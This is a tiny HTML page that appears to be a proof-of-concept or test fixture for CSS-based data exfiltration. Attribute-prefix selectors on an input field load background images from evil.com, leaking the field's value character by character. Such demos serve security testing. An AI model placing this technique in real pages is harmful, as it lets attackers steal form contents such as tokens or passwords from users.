<!doctype html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport"
          content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Static app index page</title>
</head>
<body>

<h1>Index</h1>

<style>
    input {
        color: red;
    }

    input[value^=a] {
        background-image: url("https://evil.com?a");
    }

    input[value^=ab] {
        background-image: url("https://evil.com?ab");
    }

    input[value^=abc] {
        background-image: url("https://evil.com?abc");
    }
</style>
<input type="text" value="ab">

</body>
</html>
